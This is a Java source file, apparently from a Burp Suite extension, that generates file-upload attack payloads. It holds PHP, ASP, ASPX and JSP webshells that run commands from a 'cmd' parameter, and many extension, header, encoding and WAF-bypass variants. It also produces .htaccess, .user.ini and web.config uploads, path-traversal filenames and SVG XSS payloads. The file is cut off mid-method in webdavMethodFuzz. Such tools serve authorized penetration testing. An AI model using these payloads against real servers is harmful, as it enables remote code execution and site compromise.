package AutoBurp.generator;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.Base64;

public class UploadPayloadGenerator {

    public static List<String> getAttackPayloads(String template) {
        
        Pattern pattern = Pattern.compile("filename=\".*[.](.*?)\"");
        Matcher matcher = pattern.matcher(template);
        String filenameSuffix = "";
        if (matcher.find()) {
            filenameSuffix = matcher.group(1);  
        }

        String contentType = template.split("\n")[template.split("\n").length - 1];

        List<String> allPayloads = new ArrayList<>();

        
        allPayloads.addAll(scriptSuffixFuzz(template, filenameSuffix));
        allPayloads.addAll(cffFuzz(template, filenameSuffix));
        allPayloads.addAll(contentTypeFuzz(template, filenameSuffix, contentType));
        allPayloads.addAll(windowsFeaturesFuzz(template, filenameSuffix));
        allPayloads.addAll(linuxFeaturesFuzz(template, filenameSuffix));
        allPayloads.addAll(magicBytesFuzz(template, filenameSuffix));
        allPayloads.addAll(fileContentTrickFuzz(template, filenameSuffix));
        allPayloads.addAll(userIniFuzz(template, filenameSuffix));
        allPayloads.addAll(mimeEncodingFuzz(template, filenameSuffix));
        allPayloads.addAll(httpProtocolSplitFuzz(template, filenameSuffix));
        allPayloads.addAll(chunkedEncodingFuzz(template, filenameSuffix));
        allPayloads.addAll(wafBypassFuzz(template, filenameSuffix));
        allPayloads.addAll(unicodeNormalizationFuzz(template, filenameSuffix));
        allPayloads.addAll(httpHeaderSmugglingFuzz(template, filenameSuffix));
        allPayloads.addAll(nullByteVariationsFuzz(template, filenameSuffix));
        allPayloads.addAll(protocolHandlerFuzz(template, filenameSuffix));
        allPayloads.addAll(svgXssFuzz(template, filenameSuffix));
        allPayloads.addAll(webdavMethodFuzz(template, filenameSuffix));
        allPayloads.addAll(fileContentBypassFuzz(template, filenameSuffix));

        
        return removeDuplicates(allPayloads);
    }

    public static List<String> getFuzzPayloadsForFullSection(String selectedArea) {
        List<String> fullSectionPayloads = new ArrayList<>();

        
        Pattern filenamePattern = Pattern.compile("filename=\"([^\"]*)\"");
        Matcher filenameMatcher = filenamePattern.matcher(selectedArea);

        Pattern contentPartPattern = Pattern.compile("Content-Type:.*?\\r\\n\\r\\n(.*?)$", Pattern.DOTALL);
        Matcher contentPartMatcher = contentPartPattern.matcher(selectedArea);

        if (!filenameMatcher.find() || !contentPartMatcher.find()) {
            
            fullSectionPayloads.add(selectedArea);
            return fullSectionPayloads;
        }

        String originalFilename = filenameMatcher.group(1);
        String originalContent = contentPartMatcher.group(1);
        
        List<String> phpContents = Arrays.asList(
                "<?php eval($_POST[\"cmd\"]); ?>",
                "<?php system($_REQUEST[\"cmd\"]); ?>"
        );

        List<String> aspContents = Arrays.asList(
                "<%eval request(\"cmd\")%>",
                "<%execute request(\"cmd\")%>"
        );

        List<String> aspxContents = Arrays.asList(
                "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]);%>",
                "<%@ Page Language=\"C#\" %><%eval(Request.Item[\"cmd\"]);%>"
        );

        List<String> jspContents = Arrays.asList(
                "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
                "<%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>"
        );

        
        List<String> wafBypassPrefixes = Arrays.asList(
                "GIF89a;\n",
                "#!MIME type image/gif\n",
                "<!--\n",
                "%PDF-1.5\n"
        );

        
        for (String ext : Arrays.asList("php", "asp", "aspx", "jsp")) {
            
            String newArea = selectedArea.replace("filename=\"" + originalFilename + "\"",
                    "filename=\"shell." + ext + "\"");

            
            List<String> contents = new ArrayList<>();
            if (ext.equals("php")) {
                contents = phpContents;
            } else if (ext.equals("asp")) {
                contents = aspContents;
            } else if (ext.equals("aspx")) {
                contents = aspxContents;
            } else if (ext.equals("jsp")) {
                contents = jspContents;
            }

            
            int count = 0;
            for (String content : contents) {
                if (count >= 2) break;

                
                if (originalContent != null && !originalContent.isEmpty()) {
                    String newAreaWithContent = newArea.replaceAll(
                            "Content-Type:.*?\\r\\n\\r\\n.*?$",
                            "Content-Type: text/plain\\r\\n\\r\\n" + content
                    );
                    fullSectionPayloads.add(newAreaWithContent);

                    
                    for (String prefix : wafBypassPrefixes) {
                        String newAreaWithPrefix = newArea.replaceAll(
                                "Content-Type:.*?\\r\\n\\r\\n.*?$",
                                "Content-Type: text/plain\\r\\n\\r\\n" + prefix + content
                        );
                        fullSectionPayloads.add(newAreaWithPrefix);
                    }
                }
                count++;
            }
        }

        
        return removeDuplicates(fullSectionPayloads);
    }

    private static List<String> scriptSuffixFuzz(String template, String filenameSuffix) {
        List<String> suffixPayload = new ArrayList<>();

        List<String> aspxFuzz = Arrays.asList("asPx", "aspx .jpg", "aspx_.jpg", "aspx;+2.jpg", "asaspxpx");

        List<String> jspFuzz = Arrays.asList(".jsp.jpg.jsp", "jspa", "jsps", "jspx", "jspf", "jsp .jpg", "jsp_.jpg");

        List<String> mergedAspFuzz = Arrays.asList(
                "asp;.jpg", "asp.jpg", "asp;jpg", "asp/1.jpg", "asp%00.jpg", "asp .jpg",
                "asp_.jpg", "asa", "cer", "cdx", "ashx", "asmx", "xml", "htr", "asax", "asaspp", "asp;+2.jpg",
                "asp.", "asp;", "asp,", "asp:", "asp%20", "asp%00", "asp%0a", "asp%0d%0a",
                "asp%0d", "asp%0a%0d", "asp%09", "asp%0b", "asp%0c", "asp%0e", "asp%0f","asp\\x00",
                "asp.jpg.asp", "asp.jpg.asp.jpg", "asp.asp.jpg", "asp.jpg.123",
                "asp.jpg...", "asp.jpg/", "asp.jpg\\", "asp.jpg::$DATA"
        );


        List<String> mergedPhpFuzz = Arrays.asList(
                "php1", "php2", "php3", "php4", "php5", "pHp", "php .jpg", "php_.jpg", "php.jpg", "php.  .jpg",
                "jpg/.php", "php.123", "jpg/php", "jpg/1.php", "jpg%00.php", "php%00.jpg", "php:1.jpg", "pHP.....",
                "php::$DATA", "php::$DATA......", "ph\np",
                "php.", "php;", "php,", "php:", "php%20", "php%00","php%0a", "phtml", "pht", "phpt", "php#.png", "php\\x00.png",
                "php7", "php8", "phar", "pgif", "php.jpg.php", "php.jpg.php.jpg",
                "php.php.jpg", "php.jpg.123", "php.jpg...", "php.jpg/", "php.jpg\\"
        );

        
        List<String> suffixFuzz = new ArrayList<>();
        suffixFuzz.addAll(aspxFuzz);
        suffixFuzz.addAll(jspFuzz);
        suffixFuzz.addAll(mergedAspFuzz);
        suffixFuzz.addAll(mergedPhpFuzz);

        for (String eachSuffix : suffixFuzz) {
            
            String tempTemplate = template;
            String temp = tempTemplate.replace(filenameSuffix, eachSuffix);
            suffixPayload.add(temp);
        }

        suffixPayload.add("aphp");
        suffixPayload.add("ajsp");
        suffixPayload.add("aphp");
        return suffixPayload;
    }

    private static List<String> cffFuzz(String template, String filenameSuffix) {
        
        List<String> contentDispositionPayload = new ArrayList<>();

        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp", "asmx", "xml", "html", "shtml", "svg", "swf", "htaccess");

        for (String eachSuffix : suffix) {
            
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            Pattern pattern = Pattern.compile("(filename=\".*\")");
            Matcher matcher = pattern.matcher(tempTemplateSuffix);
            String filenameTotal = "";
            if (matcher.find()) {
                filenameTotal = matcher.group(1);
            }

            String tempTempTemplateSuffix = tempTemplateSuffix;
            contentDispositionPayload.add(tempTempTemplateSuffix);

            tempTempTemplateSuffix = tempTemplateSuffix;
            contentDispositionPayload.add(tempTempTemplateSuffix.replace("Content-Disposition", "content-Disposition"));

            tempTempTemplateSuffix = tempTemplateSuffix;
            contentDispositionPayload.add(tempTempTemplateSuffix.replace("Content-Disposition: ", "content-Disposition:"));

            tempTempTemplateSuffix = tempTemplateSuffix;
            contentDispositionPayload.add(tempTempTemplateSuffix.replace("Content-Disposition: ", "content-Disposition:  "));

            tempTempTemplateSuffix = tempTemplateSuffix;
            contentDispositionPayload.add(tempTempTemplateSuffix.replace("form-data", "~form-data"));

            tempTempTemplateSuffix = tempTemplateSuffix;
            contentDispositionPayload.add(tempTempTemplateSuffix.replace("form-data", "f+orm-data"));

            tempTempTemplateSuffix = tempTemplateSuffix;
            contentDispositionPayload.add(tempTempTemplateSuffix.replace("form-data", "*"));

            tempTempTemplateSuffix = tempTemplateSuffix;
            contentDispositionPayload.add(tempTempTemplateSuffix.replace("form-data; ", "form-data;  "));

            tempTempTemplateSuffix = tempTemplateSuffix;
            contentDispositionPayload.add(tempTempTemplateSuffix.replace("form-data; ", "form-data;"));

            if (!filenameTotal.isEmpty()) {
                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename===zc." + eachSuffix));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename===\\\"zc." + eachSuffix));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename===\\\"zc." + eachSuffix + "\\\""));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename=\\\"zc." + eachSuffix + "\n\\\""));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "\nfilename===\\\"zc.\n" + eachSuffix + "\\\""));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename=\\\"zc.\nC." + eachSuffix + "\\\""));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename\n=\\\"zc." + eachSuffix + "\\\""));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename=\\\"zc\\." + eachSuffix + "\\\""));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename===zczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczc." + eachSuffix));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace("form-data", "form-data------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename=\\\"zc.jpg\\\";filename=\\\"zc." + eachSuffix + "\\\""));

                
                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename=\\\"zc." + eachSuffix + ".jpg\\\""));

                tempTempTemplateSuffix = tempTemplateSuffix;
                contentDispositionPayload.add(tempTempTemplateSuffix.replace(filenameTotal, "filename=\\\"zc.jpg." + eachSuffix + "\\\""));
            }
        }

        return contentDispositionPayload;
    }

    private static List<String> contentTypeFuzz(String template, String filenameSuffix, String contentType) {
        List<String> contentTypePayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("asp", "aspx", "php", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            String tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: image/gif"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: image/jpeg"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: application/php"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: text/plain"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: text/javascript"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, ""));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace("Content-Type", "content-type"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace("Content-Type: ", "Content-Type:  "));

            
            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: image/png"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: application/octet-stream"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: multipart/form-data"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: application/x-httpd-php"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: application/x-asp"));

            tempTemplateContentType = tempTemplateSuffix;
            contentTypePayload.add(tempTemplateContentType.replace(contentType, "Content-Type: video/mp4"));
        }

        return contentTypePayload;
    }

    private static List<String> windowsFeaturesFuzz(String template, String filenameSuffix) {
        List<String> windowsPayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            
            String tempTemplateNtfs = tempTemplateSuffix;
            Pattern pattern = Pattern.compile("(filename=\".*\")");
            Matcher matcher = pattern.matcher(tempTemplateNtfs);
            if (matcher.find()) {
                String filenameTotal = matcher.group(1);
                windowsPayload.add(tempTemplateNtfs.replace(filenameTotal, "filename=\"zc." + eachSuffix + "::$DATA\""));

                
                String tempTemplateIis = tempTemplateSuffix;
                windowsPayload.add(tempTemplateIis.replace(filenameTotal, "filename=\"zc." + eachSuffix + ";.jpg\""));

                
                String tempTemplateAds = tempTemplateSuffix;
                windowsPayload.add(tempTemplateAds.replace(filenameTotal, "filename=\"zc:" + eachSuffix + "\""));

                
                for (String device : Arrays.asList("con", "aux", "nul", "com1", "com2", "lpt1")) {
                    String tempTemplateDevice = tempTemplateSuffix;
                    windowsPayload.add(tempTemplateDevice.replace(filenameTotal, "filename=\"" + device + "." + eachSuffix + "\""));
                }
            }
        }

        return windowsPayload;
    }

    private static List<String> linuxFeaturesFuzz(String template, String filenameSuffix) {
        List<String> linuxPayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            
            String tempTemplateApache = tempTemplateSuffix;
            Pattern pattern = Pattern.compile("(filename=\".*\")");
            Matcher matcher = pattern.matcher(tempTemplateApache);
            if (matcher.find()) {
                String filenameTotal = matcher.group(1);
                linuxPayload.add(tempTemplateApache.replace(filenameTotal, "filename=\"zc." + eachSuffix + ".png\""));

                
                String tempTemplateDot = tempTemplateSuffix;
                linuxPayload.add(tempTemplateDot.replace(filenameTotal, "filename=\"zc." + eachSuffix + ".\""));

                
                String tempTemplatePath = tempTemplateSuffix;
                linuxPayload.add(tempTemplatePath.replace(filenameTotal, "filename=\"../zc." + eachSuffix + "\""));

                
                for (String character : Arrays.asList("/", "\\", "?", "*", "|", ":", "\"", "<", ">")) {
                    String tempTemplateSpecial = tempTemplateSuffix;
                    linuxPayload.add(tempTemplateSpecial.replace(filenameTotal, "filename=\"zc" + character + "." + eachSuffix + "\""));
                }
            }
        }

        return linuxPayload;
    }

    private static List<String> magicBytesFuzz(String template, String filenameSuffix) {
        
        List<String> magicBytesPayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        
        String jpgMagic = "\\xff\\xd8\\xff\\xe0";  
        String pngMagic = "\\x89PNG\\r\\n\\x1a\\n";  
        String gifMagic = "GIF89a";  
        String pdfMagic = "%PDF-1.5";  

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            for (String magicByte : Arrays.asList(jpgMagic, pngMagic, gifMagic, pdfMagic)) {
                
                if (tempTemplateSuffix.contains("Content-Type:")) {
                    Pattern pattern = Pattern.compile("Content-Type:.*", Pattern.DOTALL);
                    Matcher matcher = pattern.matcher(tempTemplateSuffix);
                    if (matcher.find()) {
                        String contentTypeLine = matcher.group(0);
                        String tempTemplateMagic = tempTemplateSuffix;
                        magicBytesPayload.add(tempTemplateMagic.replace(contentTypeLine, contentTypeLine + "\r\n\r\n" + magicByte));
                    }
                }
            }
        }

        return magicBytesPayload;
    }

    private static List<String> fileContentTrickFuzz(String template, String filenameSuffix) {
        
        List<String> contentTrickPayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            
            String tempTemplateGif = tempTemplateSuffix;
            if (tempTemplateGif.contains("Content-Type:")) {
                Pattern pattern = Pattern.compile("Content-Type:.*", Pattern.DOTALL);
                Matcher matcher = pattern.matcher(tempTemplateGif);
                if (matcher.find()) {
                    String contentTypeLine = matcher.group(0);
                    contentTrickPayload.add(tempTemplateGif.replace(contentTypeLine, contentTypeLine + "\r\n\r\nGIF89a;"));
                }
            }

            
            String tempTemplatePhp = tempTemplateSuffix;
            if (tempTemplatePhp.contains("Content-Type:") && eachSuffix.equals("php")) {
                Pattern pattern = Pattern.compile("Content-Type:.*", Pattern.DOTALL);
                Matcher matcher = pattern.matcher(tempTemplatePhp);
                if (matcher.find()) {
                    String contentTypeLine = matcher.group(0);
                    contentTrickPayload.add(tempTemplatePhp.replace(contentTypeLine, contentTypeLine + "\r\n\r\n<?php /*"));
                }
            }

            
            String tempTemplateSvg = tempTemplateSuffix;
            if (tempTemplateSvg.contains("Content-Type:")) {
                Pattern pattern = Pattern.compile("Content-Type:.*", Pattern.DOTALL);
                Matcher matcher = pattern.matcher(tempTemplateSvg);
                if (matcher.find()) {
                    String contentTypeLine = matcher.group(0);
                    String svgHeader = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"></svg>";
                    contentTrickPayload.add(tempTemplateSvg.replace(contentTypeLine, contentTypeLine + "\r\n" + svgHeader));
                }
            }
        }

        return contentTrickPayload;
    }

    private static List<String> userIniFuzz(String template, String filenameSuffix) {
        
        List<String> userIniPayload = new ArrayList<>();

        
        String tempTemplate = template;
        String tempTemplateIni = tempTemplate.replace(filenameSuffix, "user.ini");
        Pattern pattern = Pattern.compile("(filename=\".*\")");
        Matcher matcher = pattern.matcher(tempTemplateIni);
        if (matcher.find()) {
            String filenameTotal = matcher.group(1);
            userIniPayload.add(tempTemplateIni.replace(filenameTotal, "filename=\".user.ini\""));
        }

        
        tempTemplate = template;
        String tempTemplateHtaccess = tempTemplate.replace(filenameSuffix, "htaccess");
        pattern = Pattern.compile("(filename=\".*\")");
        matcher = pattern.matcher(tempTemplateHtaccess);
        if (matcher.find()) {
            String filenameTotal = matcher.group(1);
            userIniPayload.add(tempTemplateHtaccess.replace(filenameTotal, "filename=\".htaccess\""));
        }

        
        tempTemplate = template;
        String tempTemplateWebconfig = tempTemplate.replace(filenameSuffix, "config");
        pattern = Pattern.compile("(filename=\".*\")");
        matcher = pattern.matcher(tempTemplateWebconfig);
        if (matcher.find()) {
            String filenameTotal = matcher.group(1);
            userIniPayload.add(tempTemplateWebconfig.replace(filenameTotal, "filename=\"web.config\""));
        }

        return userIniPayload;
    }

    private static List<String> mimeEncodingFuzz(String template, String filenameSuffix) {
        
        List<String> mimePayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            
            String tempTemplateMime = tempTemplateSuffix;
            Pattern pattern = Pattern.compile("(filename=\".*\")");
            Matcher matcher = pattern.matcher(tempTemplateMime);
            if (matcher.find()) {
                String filenameTotal = matcher.group(1);
                mimePayload.add(tempTemplateMime.replace(filenameTotal, "filename=\"=?utf-8?Q?zc." + eachSuffix + "?=\""));

                
                try {
                    String encodedFilename = Base64.getEncoder().encodeToString(("zc." + eachSuffix).getBytes());
                    String tempTemplateB64 = tempTemplateSuffix;
                    mimePayload.add(tempTemplateB64.replace(filenameTotal, "filename=\"=?utf-8?B?" + encodedFilename + "?=\""));

                    
                    String tempTemplateMixed = tempTemplateSuffix;
                    mimePayload.add(tempTemplateMixed.replace(filenameTotal, "filename=\"=?utf-8?Q?zc=2E" + eachSuffix + "?=\""));
                } catch (Exception e) {
                    
                }
            }
        }

        return mimePayload;
    }

    private static List<String> httpProtocolSplitFuzz(String template, String filenameSuffix) {
        
        List<String> httpSplitPayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            
            String tempTemplateMulti = tempTemplateSuffix;
            if (tempTemplateMulti.contains("Content-Disposition:")) {
                Pattern pattern = Pattern.compile("(Content-Disposition:.*?filename=\".*?\")", Pattern.DOTALL);
                Matcher matcher = pattern.matcher(tempTemplateMulti);
                if (matcher.find()) {
                    String contentDisp = matcher.group(1);
                    Pattern namePattern = Pattern.compile("(name=\".*?\";)");
                    Matcher nameMatcher = namePattern.matcher(contentDisp);

                    Pattern filenamePattern = Pattern.compile("(filename=\".*?\")");
                    Matcher filenameMatcher = filenamePattern.matcher(contentDisp);

                    if (nameMatcher.find() && filenameMatcher.find()) {
                        String namePart = nameMatcher.group(1);
                        String filenamePart = filenameMatcher.group(1);

                        
                        String newContent = contentDisp.replace(namePart + " " + filenamePart,
                                namePart + "\r\nContent-Disposition: " + filenamePart);
                        httpSplitPayload.add(tempTemplateMulti.replace(contentDisp, newContent));
                    }
                }
            }

            
            String tempTemplateSemicolon = tempTemplateSuffix;
            if (tempTemplateSemicolon.contains("Content-Disposition:")) {
                Pattern pattern = Pattern.compile("(Content-Disposition:.*?filename=\".*?\")", Pattern.DOTALL);
                Matcher matcher = pattern.matcher(tempTemplateSemicolon);
                if (matcher.find()) {
                    String contentDisp = matcher.group(1);
                    String modifiedContent = contentDisp.replace("form-data;", "form-data;;;;");
                    httpSplitPayload.add(tempTemplateSemicolon.replace(contentDisp, modifiedContent));
                }
            }
        }

        return httpSplitPayload;
    }

    private static List<String> chunkedEncodingFuzz(String template, String filenameSuffix) {
        
        List<String> chunkedPayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            
            if (tempTemplateSuffix.contains("Content-Type:")) {
                String tempTemplateChunked = tempTemplateSuffix;
                String chunkedHeader = "Transfer-Encoding: chunked\r\n";
                chunkedPayload.add(tempTemplateChunked.replace("Content-Type:", chunkedHeader + "Content-Type:"));
            }
        }

        return chunkedPayload;
    }

    private static List<String> wafBypassFuzz(String template, String filenameSuffix) {
        
        List<String> wafBypassPayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            
            String tempTemplateDoubleUrl = tempTemplateSuffix;
            Pattern pattern = Pattern.compile("(filename=\".*\")");
            Matcher matcher = pattern.matcher(tempTemplateDoubleUrl);
            if (matcher.find()) {
                String filenameTotal = matcher.group(1);
                String doubleEncoded = "filename=\"zc.%252566ile\"";  
                wafBypassPayload.add(tempTemplateDoubleUrl.replace(filenameTotal, doubleEncoded));
            }

            
            String tempTemplatePollution = tempTemplateSuffix;
            if (tempTemplatePollution.contains("Content-Disposition:")) {
                StringBuilder randomData = new StringBuilder();
                for (int i = 0; i < 1024; i++) {
                    randomData.append((char) ('a' + (int) (Math.random() * 26)));
                }
                String randomComment = "X-Random-Data: " + randomData + "\r\n";
                wafBypassPayload.add(tempTemplatePollution.replace("Content-Disposition:", randomComment + "Content-Disposition:"));
            }
        }

        return wafBypassPayload;
    }

    private static List<String> unicodeNormalizationFuzz(String template, String filenameSuffix) {
        
        List<String> unicodePayload = new ArrayList<>();
        List<String> suffix = List.of("php");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            Pattern pattern = Pattern.compile("(filename=\".*\")");
            Matcher matcher = pattern.matcher(tempTemplateSuffix);
            if (matcher.find()) {
                String filenameTotal = matcher.group(1);

                
                unicodePayload.add(tempTemplateSuffix.replace(filenameTotal, "filename=\"zc.\\u03c1hp\""));  
                unicodePayload.add(tempTemplateSuffix.replace(filenameTotal, "filename=\"zc.p\\u04bbp\""));  
            }
        }

        return unicodePayload;
    }

    private static List<String> httpHeaderSmugglingFuzz(String template, String filenameSuffix) {
        
        List<String> headerSmugglingPayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            
            if (tempTemplateSuffix.contains("Content-Type:")) {
                String tempTemplateHeader = tempTemplateSuffix;
                headerSmugglingPayload.add(tempTemplateHeader.replace("Content-Type:",
                        "Content-Type: application/x-www-form-urlencoded\r\nContent-Type:"));
            }

            
            if (tempTemplateSuffix.contains("Content-Disposition:")) {
                String tempTemplateFolding = tempTemplateSuffix;
                String foldedContent = tempTemplateFolding.replace("Content-Disposition:", "Content-Disposition:\r\n ");
                headerSmugglingPayload.add(foldedContent);
            }

            
            if (tempTemplateSuffix.contains("Content-Disposition:")) {
                String tempTemplateSeparator = tempTemplateSuffix;
                for (String separator : Arrays.asList("\t", "\u000B", "\f")) {
                    headerSmugglingPayload.add(tempTemplateSeparator.replace(": ", ":" + separator));
                }
            }
        }

        return headerSmugglingPayload;
    }

    private static List<String> nullByteVariationsFuzz(String template, String filenameSuffix) {
        
        List<String> nullBytePayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php", "asp");  

        
        List<String> nullChars = Arrays.asList(
                "%00", "\\0", "\\x00"  
        );

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            Pattern pattern = Pattern.compile("(filename=\".*\")");
            Matcher matcher = pattern.matcher(tempTemplateSuffix);
            if (matcher.find()) {
                String filenameTotal = matcher.group(1);

                for (String nullChar : nullChars) {
                    nullBytePayload.add(tempTemplateSuffix.replace(filenameTotal,
                            "filename=\"zc." + eachSuffix + nullChar + "jpg\""));
                }
            }
        }

        return nullBytePayload;
    }

    private static List<String> protocolHandlerFuzz(String template, String filenameSuffix) {
        
        List<String> protocolPayload = new ArrayList<>();
        List<String> suffix = Arrays.asList("php");  

        
        List<String> protocols = Arrays.asList(
                "phar://", "zip://", "php://", "file://"
        );

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            Pattern pattern = Pattern.compile("(filename=\".*\")");
            Matcher matcher = pattern.matcher(tempTemplateSuffix);
            if (matcher.find()) {
                String filenameTotal = matcher.group(1);

                for (String protocol : protocols) {
                    protocolPayload.add(tempTemplateSuffix.replace(filenameTotal,
                            "filename=\"" + protocol + "zc." + eachSuffix + "\""));
                }
            }
        }

        return protocolPayload;
    }

    private static List<String> svgXssFuzz(String template, String filenameSuffix) {
        
        List<String> svgXssPayload = new ArrayList<>();

        String tempTemplate = template;
        String tempTemplateSvg = tempTemplate.replace(filenameSuffix, "svg");

        if (tempTemplateSvg.contains("Content-Type:")) {
            Pattern pattern = Pattern.compile("Content-Type:.*", Pattern.DOTALL);
            Matcher matcher = pattern.matcher(tempTemplateSvg);
            if (matcher.find()) {
                String contentTypeLine = matcher.group(0);

                
                List<String> svgPayloads = Arrays.asList(
                        "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
                        "<svg xmlns=\"http://www.w3.org/2000/svg\"><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0idGVzdCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#test\" /></svg>",
                        "<svg xmlns=\"http://www.w3.org/2000/svg\"><a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(1)\"><rect width=\"100\" height=\"100\" /></a></svg>"
                );

                for (String payload : svgPayloads) {
                    svgXssPayload.add(tempTemplateSvg.replace(contentTypeLine,
                            contentTypeLine + "\r\n" + payload));
                }
            }
        }

        return svgXssPayload;
    }

    private static List<String> webdavMethodFuzz(String template, String filenameSuffix) {
        
        List<String> webdavPayload = new ArrayList<>();
